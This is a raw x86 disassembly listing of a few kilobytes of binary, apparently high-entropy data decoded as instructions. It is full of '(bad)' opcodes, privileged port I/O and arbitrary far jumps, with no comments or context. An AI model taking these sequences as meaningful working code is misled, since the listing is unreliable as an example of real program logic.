  41b7da:	mov    bl,0x61
  41b7dc:	push   ebx
  41b7dd:	test   ecx,0x67aa0b01
  41b7e3:	or     BYTE PTR [edi+0x58006ff],bh
  41b7e9:	sub    eax,0x1a47ef90
  41b7ee:	call   0x9b70:0x5cb4785e
  41b7f5:	pop    edi
  41b7f6:	xchg   BYTE PTR [eax-0x4f],bh
  41b7f9:	push   ss
  41b7fa:	mov    dl,0x7
  41b7fc:	hlt    
  41b7fd:	xor    edi,eax
  41b7ff:	adc    ebp,DWORD PTR [ebx+0x541acfdb]
  41b805:	fld    DWORD PTR [esi-0x10a63b34]
  41b80b:	mov    ch,0x57
  41b80d:	dec    esi
  41b80e:	inc    ebp
  41b80f:	add    eax,0x5b
	...
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xbc
  41b881:	retf   
  41b882:	fld    TBYTE PTR [ebx+0x12471]
  41b888:	add    eax,0x3b000001
  41b88d:	inc    edx
  41b88e:	mov    ebp,edx
  41b890:	loope  0x41b86b
  41b892:	sub    DWORD PTR [esi],eax
  41b894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b895:	arpl   WORD PTR [ebx-0x1131703d],ax
  41b89b:	and    ebp,edi
  41b89d:	xchg   ebx,eax
  41b89e:	xor    eax,0xa991e324
  41b8a3:	out    dx,eax
  41b8a4:	(bad)  
  41b8a6:	ins    DWORD PTR es:[edi],dx
  41b8a7:	mov    cl,0xcd
  41b8a9:	jmp    edi
  41b8ab:	(bad)  
  41b8ac:	or     al,0x87
  41b8ae:	mov    dh,0x72
  41b8b0:	push   edx
  41b8b1:	push   ecx
  41b8b2:	jl     0x41b86b
  41b8b4:	mov    esi,DWORD PTR [edi]
  41b8b6:	xchg   edi,eax
  41b8b7:	sub    BYTE PTR ds:0xa77c11a9,ah
  41b8bd:	sub    edi,edi
  41b8bf:	pop    ecx
  41b8c0:	into   
  41b8c1:	ret    0x251a
  41b8c4:	call   0xcccd:0xd8a6416b
  41b8cb:	or     ah,BYTE PTR [edx]
  41b8cd:	mov    al,ds:0x392c5b32
  41b8d2:	cmp    al,0x6
  41b8d4:	out    0x2e,eax
  41b8d6:	mov    cl,0x43
  41b8d8:	xor    dl,ch
  41b8da:	inc    ebp
  41b8db:	sub    eax,0xe5c80b2
  41b8e0:	xor    BYTE PTR [ebx],0xd5
  41b8e3:	and    BYTE PTR [esp+edi*1-0x1a960264],al
  41b8ea:	xchg   edi,eax
  41b8eb:	loopne 0x41b889
  41b8ed:	pop    ebx
  41b8ee:	xchg   ebp,eax
  41b8ef:	mov    ds:0x1028227b,eax
  41b8f4:	mov    BYTE PTR [eax-0x54],0x70
  41b8f8:	rcl    dl,0x1
  41b8fb:	shr    DWORD PTR [esi],0xf4
  41b8fe:	dec    esp
  41b8ff:	dec    ebp
  41b900:	lea    esp,[esi]
  41b902:	cwde   
  41b903:	pop    ebx
  41b904:	enter  0xfec8,0xa7
  41b908:	ret    
  41b909:	outs   dx,DWORD PTR ds:[esi]
  41b90a:	push   edi
  41b90b:	fimul  DWORD PTR ds:0x3d60f5c4
  41b911:	pop    esi
  41b912:	mov    ebx,0xe031103f
  41b917:	jmp    0xf573:0x61f4180c
  41b91e:	pop    esp
  41b91f:	jmp    0xe784da1d
  41b924:	imul   esi,DWORD PTR [esi+0x125b44d4],0x2c5e6bee
  41b92e:	enter  0x5c,0x3c
  41b932:	stos   DWORD PTR es:[edi],eax
  41b933:	test   ebx,ecx
  41b935:	add    bh,bh
  41b937:	stos   DWORD PTR es:[edi],eax
  41b938:	pop    ecx
  41b939:	int3   
  41b93a:	or     DWORD PTR [esp+ebx*1+0x3ce43d0f],edx
  41b941:	adc    ch,0x85
  41b944:	and    DWORD PTR [ebp-0x704987d],edi
  41b94a:	xchg   ebx,eax
  41b94b:	mov    dl,0xb7
  41b94d:	hlt    
  41b94e:	add    ah,BYTE PTR [esi+esi*1+0x7d515c10]
  41b955:	cli    
  41b956:	mov    ebx,0xef6a0b6f
  41b95b:	popa   
  41b95c:	mov    ecx,0x2e2b905
  41b961:	add    ecx,eax
  41b963:	sub    al,0xdf
  41b965:	lock daa 
  41b967:	mov    ch,0xff
  41b969:	ins    BYTE PTR es:[edi],dx
  41b96a:	mov    bh,0x5a
  41b96c:	xchg   ebp,eax
  41b96d:	fstp   DWORD PTR [esi]
  41b96f:	pop    ebp
  41b970:	test   esi,esp
  41b972:	cld    
  41b973:	dec    esi
  41b974:	lods   eax,DWORD PTR ds:[esi]
  41b975:	sar    DWORD PTR [edi+ecx*4],0x36
  41b979:	cmc    
  41b97a:	jbe    0x41b982
  41b97c:	leave  
  41b97d:	mov    cl,0x7d
  41b97f:	and    al,0xe2
  41b981:	jo     0x41b953
  41b983:	pop    edx
  41b984:	into   
  41b985:	ja     0x41b949
  41b987:	addr16 sbb edi,0xd69e1037
  41b98e:	jb     0x41b987
  41b990:	mov    al,0x0
	...
  41b9f2:	add    BYTE PTR [eax],al
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	xchg   ebx,eax
  41ba01:	mov    ch,0xd9
  41ba03:	ins    DWORD PTR es:[edi],dx
  41ba04:	jbe    0x41ba2b
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    eax,0xa0000001
  41ba0d:	pop    ds
  41ba0e:	loope  0x41ba3f
  41ba10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba11:	shl    DWORD PTR [edx-0x5585b281],0x39
  41ba18:	mov    esi,0xbac37176
  41ba1d:	popf   
  41ba1e:	sbb    DWORD PTR [esi],edi
  41ba20:	and    BYTE PTR [esi],dh
  41ba22:	and    ch,bl
  41ba24:	ins    BYTE PTR es:[edi],dx
  41ba25:	xor    edx,edx
  41ba27:	out    dx,al
  41ba28:	mov    bl,0xe1
  41ba2a:	sti    
  41ba2b:	cmp    ecx,DWORD PTR [eax-0x45]
  41ba2e:	test   BYTE PTR [edi-0x3d94369d],0xa8
  41ba35:	sbb    ebp,DWORD PTR [ecx+0x213762c3]
  41ba3b:	fistp  WORD PTR [ecx+0x4]
  41ba3e:	sahf   
  41ba3f:	call   0xbacb9b98
  41ba44:	jnp    0x41ba96
  41ba46:	gs cmp al,0x89
  41ba49:	push   ebx
  41ba4a:	ret    0x2c73
  41ba4d:	out    dx,al
  41ba4e:	jp     0x41ba0a
  41ba50:	outs   dx,BYTE PTR ds:[esi]
  41ba51:	imul   esp,DWORD PTR [ebx],0x33
  41ba54:	call   0x5e731fef
  41ba59:	push   eax
  41ba5a:	adc    BYTE PTR [edx+0x34],0xc8
  41ba5e:	sbb    eax,0x60a7880e
  41ba63:	shr    BYTE PTR [eax+0x4a],cl
  41ba66:	shl    BYTE PTR [edx],1
  41ba68:	mov    ebp,0x489db410
  41ba6d:	jge    0x41ba53
  41ba6f:	es or  cl,bl
  41ba72:	mov    ecx,0x6aa4e9aa
  41ba77:	mov    WORD PTR [edi],?
  41ba79:	mov    eax,0x814be6a7
  41ba7e:	inc    ecx
  41ba7f:	adc    cl,dl
  41ba81:	aaa    
  41ba82:	xchg   BYTE PTR [edx+esi*8+0x56],dh
  41ba86:	push   es
  41ba87:	pop    esi
  41ba88:	mov    WORD PTR [esi],ds
  41ba8a:	and    edx,0x3c
  41ba8d:	out    dx,al
  41ba8e:	enter  0x72e3,0x60
  41ba92:	int3   
  41ba93:	add    eax,0x7e1e7383
  41ba98:	std    
  41ba99:	xchg   esp,eax
  41ba9a:	pop    ds
  41ba9b:	sar    bl,1
  41ba9d:	sti    
  41ba9e:	push   esp
  41ba9f:	repnz push ecx
  41baa1:	cwde   
  41baa2:	mov    esi,0x9a6f0913
  41baa7:	dec    ebx
  41baa8:	push   ds
  41baa9:	inc    edx
  41baaa:	cmp    edi,DWORD PTR [edi+ebx*8+0x3242ec3]
  41bab1:	aad    0xc7
  41bab3:	xlat   BYTE PTR ds:[ebx]
  41bab4:	out    dx,al
  41bab5:	or     BYTE PTR [edi+ecx*2],0x17
  41bab9:	add    al,0xca
  41babb:	shr    DWORD PTR [ecx+0x133cce8a],cl
  41bac1:	sbb    BYTE PTR [edi+ebx*2-0x47],bl
  41bac5:	test   BYTE PTR [ebx],ah
  41bac7:	push   es
  41bac8:	dec    esp
  41bac9:	pushf  
  41baca:	mov    bh,0x89
  41bacc:	in     eax,0xb5
  41bace:	repz mov eax,ds:0x63434f5b
  41bad4:	and    ah,BYTE PTR [ecx]
  41bad6:	(bad)  
  41bad7:	hlt    
  41bad8:	imul   edx,DWORD PTR [esi+0x585bc036],0xffffffa7
  41badf:	repz loopne 0x41baac
  41bae2:	dec    ecx
  41bae3:	icebp  
  41bae4:	jecxz  0x41ba77
  41bae6:	ins    BYTE PTR es:[edi],dx
  41bae7:	out    0xf8,al
  41bae9:	xlat   BYTE PTR ds:[ebx]
  41baea:	cmp    eax,0x8cb5e856
  41baef:	stos   DWORD PTR es:[edi],eax
  41baf0:	mov    ebx,0xfb7bfb60
  41baf5:	mov    ecx,0x72ce70c8
  41bafa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bafb:	fwait
  41bafc:	mov    bh,0x53
  41bafe:	mov    cl,0x8a
  41bb00:	shl    DWORD PTR [eax-0x30],cl
  41bb03:	fxam   
  41bb05:	aaa    
  41bb06:	test   DWORD PTR [esi+0x70eb746f],0xa2233ad9
  41bb10:	scas   eax,DWORD PTR es:[edi]
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x4f],cx
  41bb81:	push   esi
  41bb82:	or     ch,BYTE PTR [ecx+0x1267b]
  41bb88:	add    eax,0x70000001
  41bb8d:	in     eax,0x50
  41bb8f:	aaa    
  41bb90:	xchg   ebp,eax
  41bb91:	mov    ss,edi
  41bb93:	xor    BYTE PTR [edx+edi*4],0x67
  41bb97:	mov    ds:0x850972ee,al
  41bb9c:	sahf   
  41bb9d:	dec    edx
  41bb9e:	push   ebp
  41bb9f:	pop    ecx
  41bba0:	jecxz  0x41bba7
  41bba2:	pop    eax
  41bba3:	loopne 0x41bbc6
  41bba5:	ret    0x281d
  41bba8:	scas   al,BYTE PTR es:[edi]
  41bba9:	jecxz  0x41bbfa
  41bbab:	mov    BYTE PTR [ecx],bl
  41bbad:	push   0xcf60079e
  41bbb2:	(bad)  
  41bbb3:	fcomp  DWORD PTR [eax]
  41bbb5:	add    edx,ecx
  41bbb7:	sub    BYTE PTR [edi],ah
  41bbb9:	mov    bl,BYTE PTR [eax+eax*4-0x4afb5a22]
  41bbc0:	leave  
  41bbc1:	ds mov dl,0x71
  41bbc4:	leave  
  41bbc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbc6:	cwde   
  41bbc7:	jp     0x41bc13
  41bbc9:	out    0xdf,al
  41bbcb:	sbb    eax,0x9cd19817
  41bbd0:	outs   dx,DWORD PTR ds:[esi]
  41bbd1:	test   DWORD PTR [ebx],edx
  41bbd3:	sub    al,0x8d
  41bbd5:	adc    eax,0x2e1d4ab5
  41bbda:	in     al,0x16
  41bbdc:	pop    esi
  41bbdd:	arpl   WORD PTR ds:0xc4cccdc3,si
  41bbe3:	fcmovb st,st(4)
  41bbe5:	ret    0xdca0
  41bbe8:	stos   BYTE PTR es:[edi],al
  41bbe9:	push   edx
  41bbea:	in     al,0x35
  41bbec:	adc    DWORD PTR [ebx],esi
  41bbee:	xchg   ecx,eax
  41bbef:	rcr    BYTE PTR [eax-0x21180f43],0x96
  41bbf6:	test   al,0x3b
  41bbf8:	jmp    0xc40e:0xd0c71a8e
  41bbff:	jle    0x41bc23
  41bc01:	or     al,0x65
  41bc03:	xor    eax,DWORD PTR [edi]
  41bc05:	pop    esp
  41bc06:	icebp  
  41bc07:	xchg   esp,eax
  41bc08:	inc    edx
  41bc09:	test   DWORD PTR [edi+0x3439cbe8],ebx
  41bc0f:	comiss xmm6,DWORD PTR [edx]
  41bc12:	iret   
  41bc13:	cmp    edi,DWORD PTR [esi+0x56]
  41bc16:	fmul   DWORD PTR [esi]
  41bc18:	ror    DWORD PTR [edx+edx*2],cl
  41bc1b:	ins    BYTE PTR es:[edi],dx
  41bc1c:	clc    
  41bc1d:	or     al,0xf1
  41bc1f:	mov    esi,0xc0c2c18a
  41bc24:	ins    BYTE PTR es:[edi],dx
  41bc25:	xchg   ebx,eax
  41bc26:	cld    
  41bc27:	mov    DWORD PTR [edi],eax
  41bc29:	mov    BYTE PTR [edi-0x7885c886],bl
  41bc2f:	xchg   edx,eax
  41bc30:	sahf   
  41bc31:	sbb    al,0xdf
  41bc33:	cmp    eax,0x4bfabf78
  41bc38:	scas   eax,DWORD PTR es:[edi]
  41bc39:	push   edx
  41bc3a:	sti    
  41bc3b:	fisub  DWORD PTR [ebp+0x60]
  41bc3e:	push   ecx
  41bc3f:	sub    eax,0x9da3a663
  41bc44:	arpl   dx,di
  41bc46:	push   esi
  41bc47:	repz and ebx,DWORD PTR gs:[ecx+0x66]
  41bc4c:	popa   
  41bc4d:	jle    0x41bbf6
  41bc4f:	inc    edx
  41bc50:	mov    WORD PTR [eax+0x16],?
  41bc53:	cmc    
  41bc54:	stos   BYTE PTR es:[edi],al
  41bc55:	push   esi
  41bc56:	ret    
  41bc57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc58:	test   BYTE PTR [ecx],ah
  41bc5a:	aaa    
  41bc5b:	pushf  
  41bc5c:	dec    edx
  41bc5d:	sahf   
  41bc5e:	ds pop eax
  41bc60:	xor    edi,DWORD PTR [esi]
  41bc62:	mov    WORD PTR [eax-0x4b],ss
  41bc65:	inc    ebx
  41bc66:	(bad)  
  41bc67:	pushf  
  41bc68:	adc    DWORD PTR [edx-0x23],0x99952112
  41bc6f:	jp     0x41bce9
  41bc71:	jne    0x41bc94
  41bc73:	xor    cl,ah
  41bc75:	fdivr  QWORD PTR [edx+0x12]
  41bc78:	test   al,0x6c
  41bc7a:	into   
  41bc7b:	mov    eax,ds:0x124ba30c
  41bc80:	retf   0x7840
  41bc83:	xchg   BYTE PTR [ecx-0x1437bcf7],ch
  41bc89:	iret   
  41bc8a:	and    eax,DWORD PTR [ebp+0xf]
  41bc8d:	mov    ds:0x7efa2f,eax
	...
  41bcf2:	add    BYTE PTR [eax],al
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0xdd1fd9d8
  41bd02:	xor    al,0x67
  41bd04:	and    BYTE PTR [edi],0x1
  41bd07:	add    BYTE PTR ds:0x16000001,al
  41bd0d:	stos   DWORD PTR es:[edi],eax
  41bd0e:	xchg   edx,eax
  41bd0f:	rcr    bl,1
  41bd11:	add    al,0x1c
  41bd13:	mov    ah,0x36
  41bd15:	cmp    BYTE PTR [edi-0x401c9232],0xb1
  41bd1c:	test   BYTE PTR [ebx],bl
  41bd1e:	mov    WORD PTR [edx+0x656a71a8],cs
  41bd24:	cmp    BYTE PTR [esi+0x11],ah
  41bd27:	mov    WORD PTR [ecx+0x53],gs
  41bd2a:	xor    BYTE PTR [ebx],0xe6
  41bd2d:	mov    ds:0x5173283e,al
  41bd32:	int    0x88
  41bd34:	push   ebp
  41bd35:	push   edx
  41bd36:	hlt    
  41bd37:	ins    BYTE PTR es:[edi],dx
  41bd38:	dec    edi
  41bd39:	addr16 mov edx,0x8fb6e140
  41bd3f:	test   DWORD PTR [ebx-0x60913356],ebx
  41bd45:	pusha  
  41bd46:	ss fwait
  41bd48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd49:	cmp    al,0x14
  41bd4b:	sub    al,ah
  41bd4d:	pop    ebp
  41bd4e:	sahf   
  41bd4f:	mov    ah,0x1
  41bd51:	aaa    
  41bd52:	xchg   esp,eax
  41bd53:	cmp    BYTE PTR [esi],dl
  41bd55:	repnz enter 0xe3f9,0x8e
  41bd5a:	mov    BYTE PTR [esi],bh
  41bd5c:	mov    ecx,ss
  41bd5e:	out    0x3b,eax
  41bd60:	or     BYTE PTR [edi+0x79],0x44
  41bd64:	cmc    
  41bd65:	mov    ebx,DWORD PTR [esi+0x3e]
  41bd68:	iret   
  41bd69:	sbb    BYTE PTR [edi],ah
  41bd6b:	lahf   
  41bd6c:	stos   BYTE PTR es:[edi],al
  41bd6d:	jae    0x41bdd5
  41bd6f:	jg     0x41bda5
  41bd71:	add    dh,BYTE PTR [ebx]
  41bd73:	iret   
  41bd74:	adc    BYTE PTR [ecx+0x33],bh
  41bd77:	div    ebx
  41bd79:	icebp  
  41bd7a:	xchg   esi,eax
  41bd7b:	dec    ebp
  41bd7c:	xchg   DWORD PTR [edx+0x549729cc],ebp
  41bd82:	outs   dx,BYTE PTR ds:[esi]
  41bd83:	push   ebx
  41bd84:	cmp    eax,0xf514c586
  41bd89:	retf   0x2569
  41bd8c:	je     0x41bdec
  41bd8e:	mov    ecx,0x4ba15a5
  41bd93:	dec    ecx
  41bd94:	add    DWORD PTR [edx+ebx*4+0x4a311fd5],edx
  41bd9b:	or     BYTE PTR [esi],cl
  41bd9d:	in     eax,0x84
  41bd9f:	test   BYTE PTR [ebp-0x1a42f306],bl
  41bda5:	aaa    
  41bda6:	pop    edx
  41bda7:	xchg   edi,eax
  41bda8:	aam    0xe5
  41bdaa:	sub    bl,BYTE PTR [ecx+0xdaeb2]
  41bdb0:	ret    0xd8b0
  41bdb3:	add    al,BYTE PTR ds:0xc5db1622
  41bdb9:	xchg   ecx,eax
  41bdba:	test   ebp,esp
  41bdbc:	loope  0x41bd74
  41bdbe:	inc    esp
  41bdbf:	mov    ds:0x27b0a928,eax
  41bdc4:	xor    BYTE PTR [eax-0x76],dh
  41bdc7:	rol    DWORD PTR [esi],0x79
  41bdca:	into   
  41bdcb:	adc    eax,0x5d9ca485
  41bdd0:	inc    edx
  41bdd1:	(bad)
  41bdd5:	or     eax,0xc31adcbb
  41bdda:	lods   al,BYTE PTR ds:[esi]
  41bddb:	adc    BYTE PTR [esi-0x77],ch
  41bdde:	pop    ss
  41bddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bde0:	stos   BYTE PTR es:[edi],al
  41bde1:	rcr    BYTE PTR [esi+0x6a763f8c],0x4f
  41bde8:	sbb    BYTE PTR [ecx+esi*8-0x54cadb1f],0xc7
  41bdf0:	hlt    
  41bdf1:	xchg   ebp,eax
  41bdf2:	jp     0x41be1a
  41bdf4:	adc    eax,0x64a60885
  41bdf9:	mov    bh,0x65
  41bdfb:	jbe    0x41bdd4
  41bdfd:	mov    ebx,0x83da4905
  41be02:	mov    edi,DWORD PTR [eax]
  41be04:	ja     0x41bdec
  41be06:	(bad)  
  41be07:	sbb    ecx,DWORD PTR [eax+0x53]
  41be0a:	ja     0x41be28
  41be0c:	dec    esi
  41be0d:	cmp    BYTE PTR [eax+0x6d],al
  41be10:	adc    eax,0x0
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx+0x4d573f66]
  41be82:	inc    ebp
  41be83:	jg     0x41be0a
  41be85:	sub    BYTE PTR [ecx],al
  41be87:	add    BYTE PTR ds:0x19000001,al
  41be8d:	lock test DWORD PTR [edi],ecx
  41be90:	mov    edi,0x59dc7a55
  41be95:	aas    
  41be96:	adc    dl,BYTE PTR [ecx]
  41be98:	lods   al,BYTE PTR ds:[esi]
  41be99:	xor    al,0xa2
  41be9b:	int3   
  41be9c:	cmp    ch,ah
  41be9e:	(bad)  
  41bea0:	in     al,dx
  41bea1:	(bad)  
  41bea2:	retf   0x97f3
  41bea5:	adc    al,0x37
  41bea7:	arpl   WORD PTR [edx-0x79022d05],cx
  41bead:	push   ss
  41beae:	in     al,0x72
  41beb0:	outs   dx,DWORD PTR ds:[esi]
  41beb1:	jae    0x41bef0
  41beb3:	ret    
  41beb4:	inc    ecx
  41beb5:	addr16 mov cl,bl
  41beb8:	cdq    
  41beb9:	icebp  
  41beba:	jns    0x41bec5
  41bebc:	jg     0x41bec8
  41bebe:	sbb    BYTE PTR [edi-0x75],ch
  41bec1:	add    edi,eax
  41bec3:	xchg   edx,eax
  41bec4:	mov    al,0x59
  41bec6:	push   esi
  41bec7:	std    
  41bec8:	xchg   DWORD PTR [ebx-0x5e],esp
  41becb:	cld    
  41becc:	sbb    ch,bh
  41bece:	push   esi
  41becf:	mov    WORD PTR ss:[edi+0x68],?
  41bed3:	mov    ecx,0x47c76d63
  41bed8:	out    dx,eax
  41bed9:	xchg   ebx,eax
  41beda:	shl    DWORD PTR [esi-0x22],cl
  41bedd:	add    eax,0x5d52996d
  41bee2:	cmp    al,0x4e
  41bee4:	(bad)  
  41bee6:	mov    bh,0xb
  41bee8:	aad    0xd0
  41beea:	mov    ds:0x80af224f,al
  41beef:	std    
  41bef0:	add    ecx,DWORD PTR [ebx+eax*1-0x55b5a66f]
  41bef7:	sub    esi,ebp
  41bef9:	aad    0xf2
  41befb:	(bad)  
  41befc:	mov    eax,ds:0xcad9a80f
  41bf01:	mov    cl,BYTE PTR [ecx]
  41bf03:	xor    bl,BYTE PTR [edx-0x10]
  41bf06:	push   0xd1a60fbf
  41bf0b:	adc    BYTE PTR ds:0x68fcdcb6,bl
  41bf11:	fmul   DWORD PTR [ebx-0x4f]
  41bf14:	jnp    0x41beff
  41bf16:	stos   DWORD PTR es:[edi],eax
  41bf17:	jnp    0x41bf1d
  41bf19:	mov    ebp,0xc948d7bb
  41bf1e:	and    DWORD PTR ds:0x4bef8c32,esi
  41bf24:	hlt    
  41bf25:	nop
  41bf26:	xlat   BYTE PTR ds:[ebx]
  41bf27:	xchg   esi,eax
  41bf28:	scas   eax,DWORD PTR es:[edi]
  41bf29:	push   0x7e
  41bf2b:	call   0x25297519
  41bf30:	xchg   ecx,eax
  41bf31:	shl    esi,0x5f
  41bf34:	xor    al,0x94
  41bf36:	fldenv [eax]
  41bf38:	cmp    eax,0xb11d3cb0
  41bf3d:	cld    
  41bf3e:	lea    ebp,[esi]
  41bf40:	mov    ebp,0x448a4a66
  41bf45:	xor    al,0x80
  41bf47:	cwde   
  41bf48:	sbb    edx,eax
  41bf4a:	loop   0x41bf45
  41bf4c:	mov    esi,0xf2440a35
  41bf51:	test   DWORD PTR [eax-0x620c0acd],0xd381da8c
  41bf5b:	inc    esp
  41bf5c:	jge    0x41bfc5
  41bf5e:	push   edi
  41bf5f:	add    esi,DWORD PTR [ebx-0x4c]
  41bf62:	dec    ebx
  41bf63:	jne    0x41bf8c
  41bf65:	cmc    
  41bf66:	imul   edx,DWORD PTR [esi-0x66c46aa7],0x7d
  41bf6d:	jl     0x41bfbe
  41bf6f:	inc    esp
  41bf70:	push   ds
  41bf71:	aaa    
  41bf72:	pop    ebx
  41bf73:	and    BYTE PTR [edx],cl
  41bf75:	cmp    BYTE PTR [ebx],0xf8
  41bf78:	sti    
  41bf79:	retf   0x75cb
  41bf7c:	mov    dl,0xf8
  41bf7e:	inc    esi
  41bf7f:	cli    
  41bf80:	add    al,0x34
  41bf82:	sub    ah,cl
  41bf84:	mov    dh,0x9
  41bf86:	cmc    
  41bf87:	(bad)  
  41bf88:	popa   
  41bf89:	popa   
  41bf8a:	sbb    bl,BYTE PTR [esi-0x5e]
  41bf8d:	push   edi
  41bf8e:	mov    esp,0xf07e
	...
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c001:	mov    dh,0xdd
  41c003:	pop    ebp
  41c004:	mov    ch,BYTE PTR [ecx]
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    eax,0x55000001
  41c00d:	jmp    0x5b905063
  41c012:	xor    DWORD PTR [ecx],ebp
  41c014:	adc    DWORD PTR [edx],edi
  41c016:	das    
  41c017:	adc    eax,0x57edf2e1
  41c01c:	repz mov ds:0x54a2386b,al
  41c022:	outs   dx,DWORD PTR ds:[esi]
  41c023:	rol    BYTE PTR [ecx],cl
  41c025:	mov    ds:0x78f15c28,eax
  41c02a:	pop    ecx
  41c02b:	pop    ds
  41c02c:	test   BYTE PTR [ebx+0x10],al
  41c02f:	xchg   ecx,eax
  41c030:	and    DWORD PTR [eax-0x7a],edi
  41c033:	pop    eax
  41c034:	jmp    0x41c07e
  41c036:	sub    esi,DWORD PTR [edi-0x1d]
  41c039:	cmp    edi,ebx
  41c03b:	arpl   WORD PTR [eax],bx
  41c03d:	cmp    DWORD PTR [edi-0x7a],esi
  41c040:	and    bl,BYTE PTR [edi+0x38]
  41c043:	pop    eax
  41c044:	call   0x8e6aaa6
  41c049:	retf   
  41c04a:	test   BYTE PTR [ebp+0x5d],0x8f
  41c04e:	scas   eax,DWORD PTR es:[edi]
  41c04f:	adc    dl,BYTE PTR [ebx+edx*2+0x18]
  41c053:	mov    bh,0x61
  41c055:	adc    bl,BYTE PTR [edi-0xfff16d6]
  41c05b:	shl    BYTE PTR [edi],1
  41c05d:	ret    
  41c05e:	repz mov bl,0xd0
  41c061:	sub    al,0xc0
  41c063:	mov    WORD PTR [edi-0x6f21db31],ss
  41c069:	test   DWORD PTR [edi],eax
  41c06b:	xchg   ecx,eax
  41c06c:	test   DWORD PTR [ebx],ebp
  41c06e:	sysenter 
  41c070:	mov    ah,0x63
  41c072:	ins    BYTE PTR es:[edi],dx
  41c073:	clc    
  41c074:	add    eax,0xa05f26ac
  41c079:	lea    ecx,[edx+0xf59134c]
  41c07f:	xchg   BYTE PTR [eax+eiz*2+0x14],ch
  41c083:	sbb    ah,BYTE PTR [esi+0x2b8807ce]
  41c089:	mov    ch,0x9
  41c08b:	mov    dl,0xb2
  41c08d:	dec    ebx
  41c08e:	ins    BYTE PTR es:[edi],dx
  41c08f:	sub    bh,BYTE PTR [ebx]
  41c091:	xor    al,BYTE PTR [esi]
  41c093:	out    dx,al
  41c094:	xor    edi,DWORD PTR [edi-0x40c1aabd]
  41c09a:	pop    ebx
  41c09b:	outs   dx,DWORD PTR ds:[esi]
  41c09c:	and    eax,0x6ba9d882
  41c0a1:	sti    
  41c0a2:	push   es
  41c0a3:	push   esp
  41c0a4:	push   0x13
  41c0a6:	inc    ebp
  41c0a7:	and    al,0xb6
  41c0a9:	add    eax,0x17a69fe9
  41c0ae:	xchg   ebx,eax
  41c0af:	xor    BYTE PTR [ecx+0x9e8d19e],bl
  41c0b5:	fsin   
  41c0b7:	out    0x2f,al
  41c0b9:	inc    ecx
  41c0ba:	dec    esp
  41c0bb:	add    DWORD PTR [edx+0x7a857ee6],ecx
  41c0c1:	pop    es
  41c0c2:	inc    ecx
  41c0c3:	pop    ss
  41c0c4:	push   0x31
  41c0c6:	data16 jnp 0x41c0c2
  41c0c9:	sub    DWORD PTR [eax-0x48],esi
  41c0cc:	loop   0x41c146
  41c0ce:	mov    esi,0x3531980d
  41c0d3:	push   edx
  41c0d4:	push   cs
  41c0d5:	jl     0x41c102
  41c0d7:	ror    BYTE PTR [esi-0x2d],cl
  41c0da:	popa   
  41c0db:	cs push ebp
  41c0dd:	jmp    0x7673:0x2d45b4b7
  41c0e4:	push   eax
  41c0e5:	leave  
  41c0e6:	sbb    eax,DWORD PTR [ebx-0x34]
  41c0e9:	or     al,0xe7
  41c0eb:	pop    ebx
  41c0ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0ed:	inc    edx
  41c0ee:	jno    0x41c099
  41c0f0:	mov    ch,0x3a
  41c0f2:	mov    WORD PTR [eax-0x243c84bf],fs
  41c0f8:	inc    ecx
  41c0f9:	or     DWORD PTR [ebp+0x5d99bb3d],esp
  41c0ff:	sbb    eax,0x2f442fa3
  41c104:	aad    0xc2
  41c106:	cld    
  41c107:	mov    dl,0xa
  41c109:	mov    ecx,0x3b5f80d5
  41c10e:	jmp    0x0:0x3f96
	...
  41c171:	add    BYTE PTR [eax],al
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0x2ae90501,0x37
  41c182:	xchg   edx,eax
  41c183:	stos   DWORD PTR es:[edi],eax
  41c184:	(bad)
  41c188:	add    eax,0x7000001
  41c18d:	or     DWORD PTR [ebx],0x39
  41c190:	out    dx,eax
  41c191:	cmc    
  41c192:	push   0xffffff9d
  41c194:	push   ds
  41c195:	jae    0x41c160
  41c197:	xor    ah,cl
  41c199:	inc    esi
  41c19a:	xchg   edi,eax
  41c19b:	jnp    0x41c1e2
  41c19d:	adc    eax,0xac2dbd51
  41c1a2:	pop    eax
  41c1a3:	ins    BYTE PTR es:[edi],dx
  41c1a4:	test   cl,ah
  41c1a6:	add    BYTE PTR [eax],cl
  41c1a8:	jbe    0x41c140
  41c1aa:	in     eax,dx
  41c1ab:	into   
  41c1ac:	lahf   
  41c1ad:	addr16 jp 0x41c1f5
  41c1b0:	inc    DWORD PTR fs:[ebp+0x38b633ef]
  41c1b7:	sub    dl,ch
  41c1b9:	pop    esi
  41c1ba:	je     0x41c1b0
